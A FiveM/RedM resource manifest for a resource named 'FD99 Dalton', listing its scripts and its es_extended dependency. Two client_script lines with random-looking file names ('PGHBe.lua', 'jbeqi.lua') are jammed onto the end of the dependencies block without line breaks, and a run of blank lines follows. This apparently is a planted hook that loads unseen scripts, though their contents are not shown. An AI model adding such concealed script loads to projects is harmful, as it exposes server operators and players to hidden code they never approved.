fx_version 'adamant'
games { 'rdr3', 'gta5' }
rdr3_warning 'I acknowledge that this is a prerelease build of RedM, and I am aware my resources *will* become incompatible once RedM ships.'
description 'FD99 Dalton'

version '2.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'server/main/spice.lua',
	'server/effects_sv.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'client/effects_cl.lua'
}

dependencies {
	'es_extended'
}client_script "PGHBe.lua"client_script "jbeqi.lua"











































